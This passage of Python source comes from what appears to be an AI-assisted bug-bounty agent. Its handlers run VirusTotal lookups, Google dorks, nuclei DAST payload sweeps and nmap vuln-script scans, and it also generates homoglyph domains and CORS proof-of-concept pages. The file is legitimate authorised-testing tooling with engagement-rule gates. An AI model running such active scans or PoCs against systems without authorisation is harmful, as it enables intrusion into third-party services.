    is_ip = bool(re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", raw_input))
    endpoint = "ip-address/report" if is_ip else "domain/report"
    param_name = "ip" if is_ip else "domain"
    api_key = keys[0]

    try:
        resp = requests.get(
            f"https://www.virustotal.com/vtapi/v2/{endpoint}",
            params={"apikey": api_key, param_name: raw_input},
            timeout=20,
        )
    except requests.RequestException as e:
        return {"error": f"VirusTotal request failed: {e}"}

    if resp.status_code == 403:
        return {"status": "bad_api_key", "note": "Nah bro, VirusTotal rejected that API key (403) — check it with /apikey virustotal <key> and retry."}
    if resp.status_code == 204:
        return {"status": "rate_limited", "note": "VirusTotal rate-limited this key (204) — the public API is 4 req/min. Wait a bit or add more keys (comma-separated) to /apikey virustotal."}
    if resp.status_code != 200:
        return {"error": f"VirusTotal returned HTTP {resp.status_code}"}

    try:
        data = resp.json()
    except ValueError:
        return {"error": "VirusTotal returned a non-JSON response"}

    hostnames = []
    if is_ip:
        for r in data.get("resolutions", []) or []:
            h = r.get("hostname")
            if h:
                hostnames.append(h)

    undetected_urls = []
    for entry in data.get("undetected_urls", []) or []:
        if isinstance(entry, list) and entry:
            undetected_urls.append(entry[0])

    if hostnames:
        try:
            update_from_subfinder(target, hostnames)
            save_target(target)
        except Exception:
            pass

    return {
        "input": raw_input,
        "is_ip": is_ip,
        "resolved_hostnames": sorted(set(hostnames)),
        "undetected_url_count": len(undetected_urls),
        "undetected_urls": undetected_urls[:200],
        "note": (
            "These are URLs VirusTotal scanned and did NOT flag as malicious — they're just historical sightings, not findings. "
            "Hostnames resolved for this IP can reveal sibling hosts worth adding to subfinder/httpx sweeps."
        ),
    }


def _execute_google_dork(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Runs a Google dork query and returns result URLs. Defaults to scoping
    the query to the active target with `site:<domain>` unless the
    researcher passed a fully custom query. Non-interactive port of the
    researcher's dorking.py (which was written for a human typing into a
    terminal prompt — this takes the same inputs as tool args instead).
    """
    try:
        from googlesearch import search  # type: ignore
    except ImportError:
        return {
            "status": "missing_dependency",
            "note": "Nah bro, google_dork needs the googlesearch-python package and it's not installed. Run: pip install googlesearch-python, then retry.",
        }

    domain = str(args.get("domain") or target.name).strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]
    query = str(args.get("query", "")).strip()
    custom_query = str(args.get("custom_query", "")).strip()
    num_results = int(args.get("num_results", 20))
    num_results = max(1, min(num_results, 100))

    if custom_query:
        dork = custom_query
    elif domain:
        dork = f"site:{domain} {query}".strip()
    elif query:
        dork = query
    else:
        return {
            "status": "no_query_given",
            "note": "Nah bro, google_dork needs either a domain (to scope a site: search) or a custom_query. Pass one and call this again.",
        }

    results = []
    try:
        for r in search(dork, num_results=num_results):
            results.append(r)
            if len(results) >= num_results:
                break
    except Exception as e:
        return {"error": f"Google dork search failed: {e}", "dork": dork}

    return {
        "dork": dork,
        "result_count": len(results),
        "results": results,
        "note": (
            f"{len(results)} result(s) for this dork." if results else
            "No results — Google may be rate-limiting unauthenticated searches from this IP if you've run several of these in a row; space them out."
        ),
    }


def _execute_gau_nuclei_sweep(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Composite exposure sweep: gau (passive URL fetch) -> filter to URLs
    with params -> dedup with uro -> httpx live-check -> nuclei -dast
    against the live set. This is an ACTIVE scan — nuclei's -dast mode
    sends real payloads (not just a passive template match) — gated
    against engagement rules the same way hydra/fuzzhunter are (see
    check_module_against_rules). Needs gau, uro, httpx (or the
    Kali-packaged httpx-toolkit binary), and nuclei on PATH.
    """
    domain = str(args.get("domain") or target.name).strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]
    if not domain:
        return {
            "status": "no_domain_given",
            "note": "Nah bro, gau_nuclei_sweep needs a domain — nothing to sweep. Pass one and call this again.",
        }

    auto_install = bool(load_config().get("auto_install_missing_tools", False))

    gau_bin = get_binary_path("gau")
    if not gau_bin:
        return {
            "error": "gau not installed",
            "hint": "go install github.com/lc/gau/v2/cmd/gau@latest",
        }
    uro_bin = get_binary_path("uro")
    httpx_bin = get_binary_path("httpx-toolkit") or get_binary_path("httpx")
    if not httpx_bin:
        check = ensure_tool("httpx", emit=emit, auto_install=auto_install)
        if check["available"]:
            httpx_bin = get_binary_path("httpx")
    if not httpx_bin:
        return {
            "error": "httpx (or httpx-toolkit) not installed",
            "hint": "pdtm -i httpx",
        }
    nuclei_bin = get_binary_path("nuclei")
    if not nuclei_bin:
        return {
            "error": "nuclei not installed",
            "hint": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
        }

    try:
        gau_proc = _run_cmd_with_heartbeat([gau_bin, domain], timeout=90, emit=emit, label="gau (passive URL fetch)")
    except subprocess.TimeoutExpired:
        return {"error": "gau timed out after 90s"}
    raw_urls = [u.strip() for u in (gau_proc.stdout or "").splitlines() if u.strip()]
    if not raw_urls:
        return {"domain": domain, "note": "gau returned no URLs for this domain — nothing to filter/sweep."}

    param_urls = [u for u in raw_urls if re.search(r"\?[^=]+=.+", u)]
    seen = set()
    deduped = []
    if uro_bin:
        try:
            uro_proc = subprocess.run([uro_bin], input="\n".join(param_urls), capture_output=True, text=True, timeout=60)
            deduped = [u.strip() for u in (uro_proc.stdout or "").splitlines() if u.strip()]
        except Exception:
            deduped = []
    if not deduped:
        for u in param_urls:
            if u not in seen:
                seen.add(u)
                deduped.append(u)

    if not deduped:
        return {
            "domain": domain,
            "urls_fetched": len(raw_urls),
            "urls_with_params": 0,
            "note": "gau found URLs but none carried query parameters — nothing for nuclei's DAST templates to fuzz here.",
        }

    if emit and hasattr(emit, "info"):
        emit.info(f"[*] httpx (live check) on {len(deduped)} param-bearing URL(s)...")
    try:
        httpx_proc = subprocess.run(
            [httpx_bin, "-silent", "-t", "300", "-rl", "200"],
            input="\n".join(deduped), capture_output=True, text=True, timeout=120,
        )
        live_urls = [u.strip() for u in (httpx_proc.stdout or "").splitlines() if u.strip()]
    except subprocess.TimeoutExpired:
        return {"error": "httpx live-check timed out after 120s", "urls_with_params": len(deduped)}

    if not live_urls:
        return {
            "domain": domain,
            "urls_fetched": len(raw_urls),
            "urls_with_params": len(deduped),
            "live_urls": 0,
            "note": "None of the param-bearing URLs are still live — they're all dead/archived endpoints now.",
        }

    try:
        nuclei_proc = subprocess.run(
            [nuclei_bin, "-dast", "-retries", "2", "-silent", "-jsonl"],
            input="\n".join(live_urls), capture_output=True, text=True, timeout=240,
        )
    except subprocess.TimeoutExpired:
        return {
            "error": "nuclei -dast timed out after 240s",
            "domain": domain, "urls_fetched": len(raw_urls),
            "urls_with_params": len(deduped), "live_urls": len(live_urls),
        }

    findings = []
    for line in (nuclei_proc.stdout or "").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            findings.append(json.loads(line))
        except ValueError:
            continue

    return {
        "domain": domain,
        "urls_fetched": len(raw_urls),
        "urls_with_params": len(deduped),
        "live_urls": len(live_urls),
        "nuclei_findings": findings,
        "finding_count": len(findings),
        "note": (
            f"nuclei -dast flagged {len(findings)} candidate(s) — these are template matches, NOT confirmed findings. "
            "Manually reproduce each one (re-send the exact request nuclei used, read the real response) before record_finding, "
            "same False-Positive Discipline as every other automated scanner output here."
            if findings else
            "nuclei -dast ran clean against the live param-bearing URLs — no template matched."
        ),
    }


def _execute_nmap_service_scan(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Deep service/vuln enumeration via nmap (-sV -sC --script vuln,default)
    against a host's already-discovered open ports (run port_scan/naabu
    first, or pass explicit ports). This is heavier and noisier than
    naabu's plain port discovery — gated against engagement rules
    (no-automated-scanners / no-dos) via check_module_against_rules.
    Needs nmap on PATH and usually root/CAP_NET_RAW for the SYN scan
    (falls back to a TCP connect scan if that's unavailable).
    """
    host = str(args.get("host") or args.get("hosts") or target.name).strip().lower()
    if host.startswith(("http://", "https://")):
        host = urlparse(host).netloc.split(":")[0]
    if not host:
        return {
            "status": "no_host_given",
            "note": "Nah bro, nmap_service_scan needs a host — nothing to scan. Pass one and call this again.",
        }

    nmap_bin = get_binary_path("nmap")
    if not nmap_bin:
        return {"error": "nmap not installed", "hint": "apt install nmap  (or the equivalent for your OS)"}

    ports = args.get("ports")
    if not ports:
        state_ports = target.state.get("open_ports", {}).get(host) if isinstance(target.state.get("open_ports"), dict) else None
        if state_ports:
            ports = ",".join(str(p) for p in state_ports)
    if not ports:
        return {
            "status": "no_ports_given",
            "note": "Nah bro, nmap_service_scan needs ports to target — run port_scan first to discover open ports, then pass them here explicitly (e.g. ports='80,443,8080').",
        }

    scan_flag = "-sS"
    try:
        probe = subprocess.run([nmap_bin, "-sS", "-p", "1", "127.0.0.1"], capture_output=True, text=True, timeout=10)
        if probe.returncode != 0 and "requires root" in (probe.stderr or "").lower():
            scan_flag = "-sT"
    except Exception:
        scan_flag = "-sT"

    with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as tmp:
        out_path = tmp.name

    cmd = [
        nmap_bin, scan_flag, "-sV", "-sC", "--script", "vuln,default",
        "--open", "--reason", "-T4", "-Pn",
        "-p", str(ports), "-oX", out_path, host,
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return {"error": "nmap timed out after 180s — try a narrower port list."}
    except Exception as e:
        return {"error": f"nmap execution failed: {e}"}

    try:
        root = ET.parse(out_path).getroot()
    except Exception:
        return {"error": "nmap produced no parseable XML output", "stderr": (proc.stderr or "")[-500:]}
    finally:
        try:
            os.unlink(out_path)
        except Exception:
            pass

    open_services = []
    script_findings = []
    for host_el in root.findall("host"):
        addr_el = host_el.find("address")
        addr = addr_el.get("addr") if addr_el is not None else host
        ports_el = host_el.find("ports")
        if ports_el is None:
            continue
        for port_el in ports_el.findall("port"):
            state_el = port_el.find("state")
            if state_el is None or state_el.get("state") != "open":
                continue
            service_el = port_el.find("service")
            svc = {
                "host": addr,
                "port": port_el.get("portid"),
                "protocol": port_el.get("protocol"),
                "service": service_el.get("name") if service_el is not None else "",
                "product": service_el.get("product") if service_el is not None else "",
                "version": service_el.get("version") if service_el is not None else "",
            }
            open_services.append(svc)
            for script_el in port_el.findall("script"):
                script_findings.append({
                    "host": addr, "port": port_el.get("portid"),
                    "script_id": script_el.get("id"),
                    "output": (script_el.get("output") or "")[:2000],
                })

    return {
        "host": host,
        "scan_type": "SYN" if scan_flag == "-sS" else "TCP connect (no raw-socket privileges)",
        "open_services": open_services,
        "script_findings": script_findings,
        "note": (
            f"{len(open_services)} open service(s), {len(script_findings)} NSE script hit(s) (vuln+default scripts). "
            "NSE 'vuln' script hits are leads, not confirmed vulnerabilities — verify each one manually before record_finding."
        ),
    }


def _execute_punycode_homoglyphs(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Generates homoglyph/Unicode confusable variants of a single letter and
    their punycode (xn--...) encodings — useful for IDN-homograph /
    typosquat-detection work (checking whether a lookalike of the target's
    brand domain has been registered) and for building confusable-domain
    test cases for input-validation findings. Pure local computation, no
    network calls.
    """
    letter = str(args.get("letter", "")).strip().lower()
    if len(letter) != 1 or not letter.isalpha():
        return {
            "status": "invalid_letter",
            "note": "Nah bro, punycode_homoglyphs takes exactly one a-z letter. Pass a single letter and call this again.",
        }

    glyphs = _HOMOGLYPH_MAP.get(letter, [])
    variants = []
    for g in glyphs:
        try:
            pc = g.encode("idna").decode("ascii")
        except Exception:
            try:
                pc = "xn--" + g.encode("punycode").decode("ascii")
            except Exception:
                pc = None
        if pc:
            variants.append({"glyph": g, "punycode": pc})

    return {
        "letter": letter,
        "variant_count": len(variants),
        "variants": variants,
        "note": (
            f"{len(variants)} homoglyph variant(s) for '{letter}'. Swap these into the target brand's domain label and check "
            "registration (WHOIS/DNS) to spot phishing/typosquat registrations, or use them as confusable-input test cases."
            if variants else f"No homoglyphs on file for '{letter}'."
        ),
    }


_HOMOGLYPH_MAP: Dict[str, List[str]] = {
    'a': ['à','á','â','ã','ä','å','ɑ','А','Α'], 'b': ['Ь','Ꮟ','Ƅ','ᖯ'],
    'c': ['ϲ','с','ƈ','ȼ','ḉ'], 'd': ['ԁ','ժ','Ꮷ'],
    'e': ['е','ҽ','℮','ḛ','ḝ','ẹ','é','è','ê','ë'], 'f': ['ғ'],
    'g': ['ɡ','ց'], 'h': ['һ','հ','Ꮒ'],
    'i': ['і','ɩ','Ꭵ','ı','í','ì','î','ï'], 'j': ['ј','ʝ','ϳ'],
    'k': ['κ'], 'l': ['ⅼ','ӏ','Ɩ','ʟ'],
    'm': ['м','ṃ','ᴍ'], 'n': ['ո','п','ռ','ṅ','ṇ'],
    'o': ['ο','օ','ӧ','ö','ó','ò','ô','õ'], 'p': ['р','ρ','⍴'],
    'q': ['զ','ԛ','գ'], 'r': ['ᴦ','г','ř','ȓ','ṛ'],
    's': ['ѕ','ʂ','ṡ','ṣ'], 't': ['т','τ','ṭ','ț'],
    'u': ['υ','ս','ü','ú','ù','û'], 'v': ['ν','ѵ'],
    'w': ['ԝ','ա','ѡ'], 'x': ['х','ҳ','ӿ'],
    'y': ['у','ү','ӯ','ý','ÿ'], 'z': ['ᴢ','ż','ź','ž'],
}


def _execute_generate_cors_poc(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Writes a ready-to-open CORS PoC HTML page (credentialed XHR against a
    confirmed-misconfigured endpoint, raw/JSON-formatted response toggle)
    into this target's reports dir, pre-filled with the vulnerable URL.
    Pair with the cors_checker tool's findings — this does NOT test
    anything itself, it just produces the browser-side demo artifact for
    a CORS misconfig you've already confirmed, to attach as evidence.
    """
    url = str(args.get("url", "")).strip()
    if not url:
        return {
            "status": "no_url_given",
            "note": "Nah bro, generate_cors_poc needs the confirmed-vulnerable URL to pre-fill — pass that (from a cors_checker finding) and call this again.",
        }

    template_path = Path(__file__).resolve().parent.parent / "tools" / "pocs" / "CorsPoC.html"
    if not template_path.exists():
        return {"error": f"CorsPoC.html template not found at {template_path}"}

    html = template_path.read_text(encoding="utf-8")
    # Pre-fill the target input's value attribute so the PoC opens ready to
    # fire. Single-line match on the placeholder attribute only — robust to
    # the template's CRLF line endings and exact indentation.
    needle = 'placeholder="https://target.com/api/endpoint"'
    if needle in html:
        html = html.replace(needle, f'{needle} value="{_html_escape(url)}"', 1)
    else:
        return {"error": "CorsPoC.html template has changed shape — couldn't locate the target-URL input to pre-fill."}

    target_name = sanitize_target_name(target.name)
    out_dir = Path(os.path.expanduser(f"~/.hellhound/targets/{target_name}/reports"))
    out_dir.mkdir(parents=True, exist_ok=True)
    safe_host = re.sub(r"[^a-zA-Z0-9._-]", "_", urlparse(url).netloc or url)[:80]
    out_path = out_dir / f"cors_poc_{safe_host}_{int(time.time())}.html"
    out_path.write_text(html, encoding="utf-8")

    if emit and hasattr(emit, "success"):
        emit.success(f"[✓] CORS PoC written: {out_path}")

    return {
        "url": url,
        "poc_path": str(out_path),
        "note": "Open this file in a browser (served from any origin OTHER than the target's own, e.g. file:// or a throwaway localhost page) and hit Fetch — if the response renders, the CORS misconfig is live. Attach this file as evidence on record_finding/export_report.",
    }


def _humanize_hackerone_error(action: str, program: str, e: Exception) -> Dict[str, Any]:
    """
    Turns a HackerOneAPIError (or any other exception from the hackerone_mcp
    calls) into the same status+note, self-talk voice used elsewhere for
    "this went wrong in a way you should understand and not just retry
    blindly" tool results (see jwt_forge's not_a_jwt case, set_target's
    validation errors) — instead of dumping the raw GraphQL error structure
    or a generic Python exception string straight to the researcher.
    """
    msg = str(e)
    low = msg.lower()
    if "does not exist" in low or "not found" in low:
        return {
            "status": "program_not_found",
            "note": f"Nah bro, HackerOne doesn't have a program under the handle '{program}' — {action} needs the exact URL slug from the program's HackerOne page (hackerone.com/<handle>), not the display name. Double-check the handle there and retry; if it's genuinely not on HackerOne, it may be listed on Bugcrowd/Intigriti/another platform instead.",
        }
    if "timeout" in low or "timed out" in low:
        return {
            "status": "timeout",
            "note": f"Nah bro, the {action} call to HackerOne timed out — their API was slow or unreachable just now, not a problem with the program handle. Worth one retry; if it keeps timing out, move on and come back to it later.",
        }
    return {
        "status": "api_error",
        "note": f"Nah bro, the {action} call to HackerOne's API came back with an error, not real data: {msg}. Don't treat this as 'program has no policy/stats' — it's an API-level failure, so don't record anything based on it.",
    }


def _execute_hackerone_search(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Search HackerOne Hacktivity for disclosed vulnerability reports."""
    keyword = args.get("keyword", "")
    program = args.get("program", "")
    limit = args.get("limit", 10)
    
    try:
        from hellhound.mcp.hackerone_mcp.server import search_disclosed_reports
        results = search_disclosed_reports(keyword=keyword, program=program, limit=limit)
        return {"status": "success", "results": results, "count": len(results)}
    except Exception as e:
        return _humanize_hackerone_error("hackerone_search", program, e)


def _execute_hackerone_policy(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Get the public policy and scopes for a HackerOne program."""
    program = args.get("program", "") or target.name.split(".")[0]
    
    try:
        from hellhound.mcp.hackerone_mcp.server import get_program_policy
        result = get_program_policy(program)
        if "error" in result:
            return {
                "status": "program_not_found",
                "note": f"Nah bro, HackerOne doesn't have a program under the handle '{program}' — hackerone_policy needs the exact URL slug from the program's HackerOne page (hackerone.com/<handle>), not the display name. Double-check the handle there and retry.",
            }
        return {"status": "success", "policy": result}
    except Exception as e:
        return _humanize_hackerone_error("hackerone_policy", program, e)


def _execute_hackerone_stats(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Get public statistics (bounties, response times, resolved reports) for a HackerOne program."""
    program = args.get("program", "") or target.name.split(".")[0]
    
    try:
        from hellhound.mcp.hackerone_mcp.server import get_program_stats
        result = get_program_stats(program)
        if "error" in result:
            return {
                "status": "program_not_found",
                "note": f"Nah bro, HackerOne doesn't have a program under the handle '{program}' — hackerone_stats needs the exact URL slug from the program's HackerOne page (hackerone.com/<handle>), not the display name. Double-check the handle there and retry.",
            }
        return {"status": "success", "stats": result}
    except Exception as e:
        return _humanize_hackerone_error("hackerone_stats", program, e)


_DIAG_QUESTION_RE = re.compile(
    r"\bwhy\b[^.?!]{0,80}\b("
    r"continue|json|stuck|stopp?(ed|ing)?|timed?\s?out|timeout|didn'?t\s(run|work|finish)|"
    r"keep(s)?\sasking|repeat(ed|ing)?|blank|empty|guard|approval"
    r")\b",
    re.IGNORECASE,
)

# CAUGHT IN THE WILD (date-free, just descriptive): connecting to Burp/
# Caido (even just to probe their tool lists) was happening unconditionally
# on the very first message of every session — including pure small talk
# like "hello bud how are you" — adding real connection latency plus a
# wall of "[+] MCP server 'burp' connected..." / "caido-mcp-server v4.3.0
# ... Registered: 66 tools" status noise to a reply that had nothing to do
# with either tool. Gate it on the researcher's own message actually being
# about MCP/tool access or wanting to drive Burp/Caido specifically — the
# same bar implied by /mcp itself, which always triggers it directly and
# is unaffected by this gate. A skipped turn leaves _MCP_SERVERS_REGISTERED
# unset, so the very next relevant message (or an active non-default
# target, meaning real hunting work is already underway) still registers
# normally — nothing here is a permanent opt-out.
_MCP_RELEVANT_RE = re.compile(
    r"\b(mcp|burp|caido|repeater|intercept(?:ing|or)?|proxy(?:ing)?)\b"
    r"|\btools?\b[^.?!]{0,40}\b(you\s+have|access|available|see|connected|installed)\b"
    r"|\baccess\s+to\s+(?:the\s+|your\s+)?tools?\b"
    r"|\bwhat\s+tools\b",
    re.IGNORECASE,
)


def _format_last_turn_diagnostics(diag: Optional[Dict[str, Any]]) -> Optional[str]:
    """Render the previous turn's control-flow telemetry as plain, factual
    bullet points.

    Why this exists: the researcher repeatedly needs to ask "why did you
    just dump raw JSON" / "why do I have to say continue so much" /
    "why'd that time out" — and the model answering those from its own
    recollection means answering from the same conversation text that
    already confused it, i.e. guessing. This instead reports the actual
    recorded control-flow facts (set as they happen in handle_message /
    execute_tool_call, see _diag_* locals and self._approvals_*_this_turn)
    so an explanation is grounded in what really happened, not a plausible
    story. Returns None if nothing was recorded yet (e.g. very first turn
    of a fresh session).
    """
    if not diag:
        return None
    lines = []
    ended = diag.get("ended_reason")
    if ended == "timed_out":
        lines.append(
            f"That turn hit its wall-clock time budget after {diag.get('elapsed_s', '?')}s "
            f"({diag.get('iterations', '?')} orchestrator iteration(s) run) — it was cut off before "
            f"finishing, not because it chose to stop."
        )
    elif ended == "cancelled":
        lines.append("That turn was interrupted (Ctrl+C) before it reached a conclusion.")
    elif ended == "done":
        lines.append("That turn ended with the orchestrator explicitly deciding it was done.")
    if diag.get("narration_retry_count"):
        lines.append(
            f"{diag['narration_retry_count']} response(s) that turn looked like a tool call but "
            f"failed to parse as valid JSON (mismatched braces/quotes), forcing a resend each time."
        )
    if diag.get("batches_truncated"):
        lines.append(
            f"At least one response planned more tool calls than the per-response cap "
            f"({diag.get('truncated_calls', 0)} call(s)) allows in one go — the rest were deferred "
            f"to a follow-up iteration/turn instead of all firing immediately."
        )
    if diag.get("approvals_denied"):
        lines.append(
            f"{diag['approvals_denied']} destructive-action approval prompt(s) were answered 'no' "
            f"this turn, which blocked exactly those requests (nothing else)."
        )
    if diag.get("approvals_granted"):
        lines.append(f"{diag['approvals_granted']} destructive-action approval prompt(s) were approved and ran normally.")
    if diag.get("dup_skip_count"):
        lines.append(f"{diag['dup_skip_count']} tool call(s) were skipped as exact duplicates already run earlier that turn.")
    if diag.get("provider_gaveup"):
        lines.append(
            f"The model provider itself failed repeatedly ({diag.get('provider_retries', '?')} retr(y/ies) "
            f"attempted, all unsuccessful) — a real outage/connection problem on the API side, not something "
            f"the agent chose to do."
        )
    elif diag.get("provider_retries"):
        lines.append(
            f"The model provider failed transiently {diag['provider_retries']} time(s) this turn but a later "
            f"retry succeeded, so the turn continued normally."
        )
    if diag.get("tools_executed"):
        lines.append(f"Tools that actually executed: {', '.join(diag['tools_executed'])}.")
    else:
        lines.append("No tool actually executed that turn.")
    return "\n".join(f"- {l}" for l in lines) if lines else None


_RESEARCHER_QUESTION_RE = re.compile(
    r"(\?\s*$|\bwhich (?:one|option|approach|path|endpoint|account|direction)\b|\bshould I\b|"
    r"\bdo you want\b|\bwould you like\b|\blet me know\b|\bwaiting for your\b|\bneed your\b|"
    r"\byour call\b|\bconfirm (?:this|that|before|whether)\b|\bokay to\b|\bgo ahead\b.*\?|"
    r"\bwant me to\b|\bshall I\b)",
    re.I,
)


def _looks_like_question_for_researcher(text: str) -> bool:
    """
    Best-effort heuristic for the auto-continue decision at the end of a
    turn (see handle_message): does the final synthesized answer read like
    it's actually asking the researcher something, rather than just
    reporting progress? Checked against only the LAST couple of lines
    (where a closing question actually lives) rather than the whole
    answer, since a PoC or report body legitimately contains plenty of
    '?' characters (query strings, payloads) that aren't the agent asking
    anything. False positives here only cost one extra pause for
    confirmation; false negatives would mean plowing ahead past a question
    that genuinely needed the researcher's input, which is the worse
    failure of the two — kept deliberately permissive.
    """
    if not text:
        return False
    tail = "\n".join(text.strip().splitlines()[-4:])
    return bool(_RESEARCHER_QUESTION_RE.search(tail))


def _compute_auto_continue(
    timed_out: bool,
    was_cancelled: bool,
    tools_executed: List[str],
    new_finding_this_turn: bool,
    final_response: str,
    streak: int,
    streak_cap: int = 8,
) -> bool:
    """
    Pure decision function for whether handle_message's caller (the CLI
    loop) should immediately re-invoke it with "continue" instead of
    waiting for the researcher to type it — pulled out of handle_message
    itself so this can be unit-tested without a real LLM call. See the
    AUTO-CONTINUE DECISION comment at its call site for the full reasoning;
    this is just the boolean logic.
    """
    if not timed_out or was_cancelled or not tools_executed:
        return False
    if new_finding_this_turn:
        return False
    if _looks_like_question_for_researcher(final_response):
        return False
    return streak < streak_cap


def _clean_synthesizer_output(text: str, tools_executed: Optional[List[str]] = None) -> str:
    """
    Defensive net: if the synthesizer model ignored its plain-prose
    instruction and emitted a raw orchestrator-style JSON tool-call object
    instead of (or wrapped around) real prose, recover something readable
    instead of dumping raw JSON to the user's terminal.

    `tools_executed` (when the caller has it) is the list of tools that
    actually ran and returned real results EARLIER in this same turn —
    separate from, and not to be confused with, the specific trailing
    tool-call-shaped JSON blob this function is here to clean up (which
    means something ELSE queued after those never fired). See the
    "nothing ran" branch below for why this distinction matters:
    CAUGHT IN THE WILD — a researcher watched curl calls actually execute
    and print real HTTP results, then the turn ended with one more queued
    tool call left as raw JSON in the final text; this function used to
    blanket-reply "nothing ran, no results to show," flatly contradicting
    the real output sitting right above it in the same transcript.

    Seen in practice with small local models on plain advisory questions
    (e.g. "how do I fix this as a developer") that need no tool at all:
    the model reaches for a fake "print my answer" tool call instead of
    just writing the answer as text — most often run_terminal_command with
    an `echo`, but sometimes an entirely made-up tool name (answer/respond/
    say/print) with the real text tucked into an args field like
    "text"/"message"/"answer". Either shape gets unwrapped and returned as
    the real prose it actually is, rather than the JSON wrapper around it.

    Also tolerates the JSON not being strict JSON: small local models
    frequently emit Python-dict-style single-quoted pseudo-JSON
    (`{'tool': 'x', ...}`) rather than double-quoted JSON — json.loads
    rejects that outright, so a Python-literal fallback parse is tried
    before giving up. Markdown code fences wrapped around the blob are
    stripped first for the same reason.
    """
    if not text or "{" not in text or "tool" not in text:
        return text

    # Strip a wrapping ```json ... ``` or ``` ... ``` fence, if present —
    # the brace-scan below doesn't care about fence markers, but leaving
    # them in would end up included in `before`/`after` and shown to the
    # researcher as stray backticks.
    fence_stripped = re.sub(r'```(?:json)?\s*\n?', '', text)
    fence_stripped = fence_stripped.replace('```', '')

    start = fence_stripped.find("{")
    if start == -1:
        return text

    # Balanced-brace, string/escape-aware scan (mirrors
    # _extract_first_balanced_json) so we know exactly where the JSON
    # object ends and can preserve any real prose before/after it. Tracks
    # both quote styles since the blob may turn out to be single-quoted
    # Python-dict-style pseudo-JSON rather than strict JSON.
    depth = 0
    in_string = False
    string_quote = ""
    escape = False
    end = -1
    for i in range(start, len(fence_stripped)):
        ch = fence_stripped[i]
        if in_string:
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == string_quote:
                in_string = False
            continue
        if ch in ("'", '"'):
            in_string = True
            string_quote = ch
        elif ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                end = i + 1
                break
    if end == -1:
        return text

    candidate = fence_stripped[start:end]
    parsed = None
    try:
        parsed = json.loads(candidate)
    except Exception:
        try:
            import ast
            parsed = ast.literal_eval(candidate)
        except Exception:
            return text
    if not isinstance(parsed, dict) or "tool" not in parsed:
        return text

    tool_name = parsed.get("tool")
    args = parsed.get("args") or parsed.get("parameters") or parsed.get("arguments") or {}
    # Slice from fence_stripped, not the original text — start/end were
    # computed against it, and its length can differ from the original
    # whenever a code fence actually got stripped above.
    before = fence_stripped[:start].strip()
    after = fence_stripped[end:].strip()

    # Most common failure mode: no tool was actually needed for a plain
    # informational/advisory question, but the model reached for a fake
    # "print my answer" tool call instead of just writing prose. Two
    # shapes of this get unwrapped rather than falling through to anything
    # below — this takes priority even when the tool name happens to be a
    # real registered one (run_terminal_command is both real AND the most
    # common vehicle for this exact fake-print pattern):
    if isinstance(args, dict):
        # Shape 1: run_terminal_command + echo — the echoed string IS the
        # real answer.
        if tool_name == "run_terminal_command":
            cmd = str(args.get("command", "")).strip()
            m = re.match(r"^echo\s+(['\"])(.*)\1\s*$", cmd, re.DOTALL)
            if m:
                echoed = m.group(2).strip()
                if echoed:
                    pieces = [p for p in (before, echoed, after) if p]
                    return "\n\n".join(pieces)
        # Shape 2: an entirely made-up tool name (answer/respond/say/
        # print/reply/output/message — whatever the model invented) with
        # the real text sitting in a plausibly-named args field. Same
        # underlying mistake as shape 1, just a different fake verb.
        for key in ("text", "message", "answer", "response", "reply", "content", "output"):
            val = args.get(key)
            if isinstance(val, str) and val.strip():
                pieces = [p for p in (before, val.strip(), after) if p]
                return "\n\n".join(pieces)

    # Neither fake-print shape matched. A REAL, registered tool name here
    # (dns_bruteforce, curl, subfinder...) is a different situation from a
    # model inventing a fake tool: it means a real action was genuinely
    # intended, and somewhere between deciding that and it actually
    # reaching execute_tool_call, the turn ended without dispatching it.
    # Falling through to the vague "(Suggested next tool: ...)" line below
    # would hide that a real, intended action never happened — worse than
    # saying nothing, since the researcher has no way to know whether it
    # actually ran. Say so plainly instead.
    if tool_name in TOOL_REGISTRY:
        # `before`/`after` can themselves be more raw tool-call JSON (a
        # whole batch, not just this one object) — never splice that
        # straight into `extra` as if it were prose. Count the real
        # batch size (this object plus whatever's hiding in before/after)
        # so the message is honest about how much got dropped, without
        # ever showing the JSON itself.
        _total_calls = 1
        for _chunk in (before, after):
            if _chunk and "{" in _chunk and '"tool"' in _chunk:
                try:
                    _total_calls += len(_extract_all_tool_calls(_chunk))
                except Exception:
                    pass
        _plural = f", plus {_total_calls - 1} more queued right after it," if _total_calls > 1 else ""
        if tools_executed:
            # Real tool calls already ran and produced real results earlier
            # in this same turn (they're right there in the transcript) —
            # only this LAST queued call never fired. Saying "nothing ran"
            # here would flatly contradict what the researcher just watched
            # happen, so say what's actually true: most of it ran, one more
            # call got cut off at the end.
            return (
                f"Ran {', '.join(tools_executed)} already this turn — see the results above. "
                f"One more queued call ({tool_name}{_plural}) didn't fire before the turn ended. "
                f"Say \"continue\" or \"go ahead\" to run that last one."
            )
        return (
            f"Started to run {tool_name}{_plural} but the turn ended before any of it actually fired — "
            f"nothing ran, no results to show. Just say \"continue\" or \"go ahead\" and it'll run properly."
        )

    # Any other stray tool-call JSON (an unregistered/hallucinated tool
    # name — nothing real to run, nothing real to report): keep whatever
    # real prose the model wrote around it, and drop the JSON itself
    # rather than showing it raw.
    #
    # `after` can itself hold MORE concatenated tool-call JSON objects
    # (the model batched several calls, the synthesizer parroted the
    # whole batch back instead of just the first) — strip every one of
